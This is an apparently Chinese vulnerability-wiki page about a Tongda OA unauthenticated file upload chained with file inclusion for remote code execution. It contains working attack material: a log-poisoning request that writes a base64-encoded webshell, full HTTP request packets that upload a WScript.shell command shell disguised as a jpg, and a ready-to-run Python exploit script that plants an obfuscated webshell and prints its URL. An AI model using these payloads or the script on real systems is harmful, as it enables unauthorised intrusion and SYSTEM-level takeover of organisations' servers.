<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>通达oa 任意文件上传+rce+文件包含 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u901a\u8fbeoa \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20+rce+\u6587\u4ef6\u5305\u542b", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/" class="btn btn-xs btn-link">
        通达oa 任意账号跳转
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        通达oa 任意⽂件上传漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="oa-rce">通达oa 任意文件上传+rce+文件包含<a class="headerlink" href="#oa-rce" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>有些版本gateway.php路径不同</p>
<p>例如2013：</p>
<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ispirit</span><span class="o">/</span><span class="n">im</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">php</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ispirit</span><span class="o">/</span><span class="n">interface</span><span class="o">/</span><span class="n">gateway</span><span class="o">.</span><span class="n">php</span>
</code></pre></div>

<p>例如2017：</p>
<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ispirit</span><span class="o">/</span><span class="n">im</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">php</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">mac</span><span class="o">/</span><span class="n">gateway</span><span class="o">.</span><span class="n">php</span>

<span class="n">C</span><span class="p">:</span>\<span class="n">MYOA</span><span class="o">&gt;</span><span class="n">dir</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">b</span><span class="w"> </span><span class="n">gateway</span><span class="o">.</span><span class="n">php</span>
<span class="n">C</span><span class="p">:</span>\<span class="n">MYOA</span>\<span class="n">webroot</span>\<span class="n">mac</span>\<span class="n">gateway</span><span class="o">.</span><span class="n">php</span>
</code></pre></div>

<p>2015没有文件包含，官方给的补丁2017的没有修复文件包含，所以还有很多种包含日志文件getshell的姿势，不一定要文件上传。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">http</span><span class="o">:</span><span class="c1">//www.0-sec.org/api/ddsuite/error.php</span>

<span class="nx">POST</span><span class="o">:</span><span class="nx">message</span><span class="o">=</span><span class="cp">&lt;?php</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;2.php&quot;</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;PD9waHAgYXNzZXJ0KCRfUE9TVFsxXSk7Pz4=&quot;</span><span class="p">));</span><span class="cp">?&gt;</span><span class="mf">52011</span>

<span class="nx">然后包含</span>

<span class="nx">http</span><span class="o">:</span><span class="c1">//www.0-sec.org/mac/gateway.php</span>
<span class="nx">POST</span><span class="o">:</span><span class="nx">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;url&quot;</span><span class="o">:</span><span class="s2">&quot;..\/..\/logs\/oa\/2003\/dd_error.log&quot;</span><span class="p">}</span>

<span class="nx">在http</span><span class="o">:</span><span class="c1">//192.168.124.138/mac/2.php就是shell密码1</span>
</code></pre></div>

<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>V11版2017版2016版2015版2013增强版2013版</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>我们根据官网发布的补丁，更新的是ispirit/im/upload.php这个文件，我们跟进这个文件</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId24.png" /></p>
<p>当传入P参数时，就可以绕过登录认证，直接获取到session。</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId25.png" /></p>
<p>跟进函数流程，逻辑判断是否传入DEST_UID并且不为0，否则直接退出。</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId26.png" /></p>
<p>传入一个DEST_UID后，访问，提示无文件上传</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId27.png" /></p>
<p>1\&lt;=count($_FILES)判断是否有文件上传，后面的逻辑，如果传入文件，直接进入未授权任意文件上传</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId28.png" /></p>
<p>可以使用python3的requests库进行文件上传操作，跟进代码，后面判断的是UPLOAD_MODE上传模式的值，如果传入UPLOAD_MODE，当取值为1，2，3时，将回显。</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId29.png" /></p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId30.png" /></p>
<p>进入上传逻辑，调用upload()函数，upload()会对上传的文件进行后缀名检测，这里使用name.php.即可绕过文件后缀名限制，调用upload函数后，会返回一个$ATTACHMENTS数组，这也是后面我们传入上传模式UPLOAD_MODE值时会根据该值的取值返回$ATTACHMENTS[ID]和$ATTACHMENTS[NAME]</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId31.png" /></p>
<p>跟进upload()函数，$ATTACHMENTS[ID]由add_attach()函数返回在add_attach()可以看到传入的文件存储路径为</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId32.png" /></p>
<p>$MODULE的值在upload.php文件中指定为im</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId33.png" /></p>
<p>存储路径就保存在在upload.php文件中指定的attch/im/$YM/文件夹下面，文件名就是$ATTACH_ID.$ATTACH_FILEadd_attach()函数最终返回的前台的能够回显的$ATTACHMENTS[ID]里面就包含上传的文件名和路径。</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId34.png" /></p>
<p>此时，我们就可以构造payloads进行任意文件上传</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId35.png" /></p>
<p>但是，开发者指定的保存路径不在wwwroot目录下面，我们只能通过文件包含漏洞进行包含触发漏洞。文件包含漏洞出现在/ispirit/interface/gateway.php，首先接从客户端接收一个$json的参数，然后将$json转换为数组后再转换成变量，当存在$json数据中存在一个key为url的且不为空的值时，并且url传入的数据中有general/或者ispirit/或者module/时，执行include_once包含该url。</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId36.png" /></p>
<p>此处文件包含的另外一个利用，直接触发nginx的错误日志，利用文件包含直接getshell</p>
<p><img alt="" src="../resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2Brce%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId37.png" /></p>
<h3 id="_4">请求包<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/ispirit/im/upload.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">10.10.20.116:88</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">658</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=123</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;

2
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name=&quot;P&quot;

123
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name=&quot;DEST_UID&quot;

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;
Content-Type: image/jpeg

&lt;?php
$command=$_POST[&#39;cmd&#39;];
$wsh = new COM(&#39;WScript.shell&#39;);
$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput;
?&gt;
------WebKitFormBoundarypyfBh1YB4pV8McGB--
POST /mac/gateway.php HTTP/1.1
Host: 10.10.20.116:88
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.21.0
Content-Length: 71
Content-Type: application/x-www-form-urlencoded

json={&quot;url&quot;:&quot;/general/../../attach/im/2003/938379153.jpg&quot;}&amp;cmd=net user
</code></pre></div>

<h3 id="poc-rce">poc （上传+文件包含+rce）<a class="headerlink" href="#poc-rce" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="c1"># 定义webshell，因为是包含，所以用写入马比较方便</span>
<span class="c1"># 这个马自带bypass disable_function 功能</span>
<span class="n">shell</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;&lt;?php</span>
<span class="s1">$fp = fopen(&#39;readme.php&#39;, &#39;w+&#39;);</span>
<span class="s1">$a = base64_decode(&quot;JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==&quot;);</span>
<span class="s1">fwrite($fp, urldecode($a));</span>
<span class="s1">fclose($fp);</span>
<span class="s1">?&gt;</span>
<span class="s1">&#39;&#39;&#39;</span>

<span class="c1"># 输入目标</span>
<span class="n">url</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;input the TARGET(example:[url]https://127.0.0.1:1080[/url])&gt;&quot;</span><span class="p">)</span>
<span class="c1"># 定义上传目录和包含目录</span>
<span class="n">upload_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s2">&quot;/ispirit/im/upload.php&quot;</span>
<span class="n">include_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s2">&quot;/ispirit/interface/gateway.php&quot;</span>
<span class="c1"># 定义shell目录，如果要修改名字，需要把shell里面的一起改了</span>
<span class="n">shell_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s2">&quot;/ispirit/interface/readme.php&quot;</span>
<span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;ATTACHMENT&#39;</span><span class="p">:</span> <span class="n">shell</span><span class="p">}</span>
<span class="c1"># 参见源码，有漏洞的版本只要POST P和DEST_UID参数就会自动生成session</span>
<span class="n">upload_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;P&quot;</span><span class="p">:</span> <span class="s2">&quot;123&quot;</span><span class="p">,</span> <span class="s2">&quot;DEST_UID&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;UPLOAD_MODE&quot;</span><span class="p">:</span> <span class="s2">&quot;2&quot;</span><span class="p">}</span>
<span class="c1"># 上传</span>
<span class="n">upload_res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">upload_data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
<span class="c1"># 此时会返回上传文件的路径</span>
<span class="n">path</span> <span class="o">=</span> <span class="n">upload_res</span><span class="o">.</span><span class="n">text</span>
<span class="c1"># 解析返回值获取上传地址</span>
<span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="p">[</span><span class="n">path</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">path</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
            <span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;\/&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span>
<span class="c1"># 由于上传文件会自动改为jpg，所以要用gateway.php包含</span>
<span class="n">include_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;json&quot;</span><span class="p">:</span> <span class="s2">&quot;{</span><span class="se">\&quot;</span><span class="s2">url</span><span class="se">\&quot;</span><span class="s2">:</span><span class="se">\&quot;</span><span class="s2">/general/../../attach/im/&quot;</span> <span class="o">+</span> <span class="n">path</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">}&quot;</span><span class="p">}</span>
<span class="c1"># 包含+自动写入shell</span>
<span class="n">include_res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">include_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">include_data</span><span class="p">)</span>
<span class="c1"># 返回结果 a参数可以直接填入系统命令（比如whoami），默认是system权限</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;shell is here:&#39;</span><span class="o">+</span><span class="n">shell_url</span><span class="o">+</span><span class="s1">&#39;?a=command&#39;</span><span class="p">)</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/" class="btn btn-xs btn-link">
        通达oa 任意账号跳转
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        通达oa 任意⽂件上传漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>